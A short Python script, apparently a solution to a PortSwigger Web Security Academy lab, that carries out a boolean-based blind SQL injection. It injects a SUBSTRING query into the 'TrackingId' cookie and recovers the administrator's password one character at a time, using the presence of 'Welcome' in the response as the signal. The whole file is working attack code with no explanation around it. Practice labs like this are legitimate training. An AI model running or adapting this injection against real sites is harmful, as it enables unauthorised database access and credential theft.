import requests

possiblePass = "qwertyuiopasdfghjklzxcvbnm1234567890"
session = ""

password = ""
for i in range(1,21):
    for p in possiblePass:
        cookies = {"TrackingId": "YUvjnNHXFwKYVWIm' AND (SELECT SUBSTRING(password," + str(i) + ",1) FROM users WHERE username='administrator')='"+ p ,
                    "session":  session}

        # Extract headers and body from the request text
        # Send the HTTP request
        response = requests.request("get","https://0a1000de043483d680004ab4008d0050.web-security-academy.net/" , cookies=cookies)
        
        if("Welcome" in str(response.content,'utf-8')):
            password += p
            print(p)
            break



print(password)
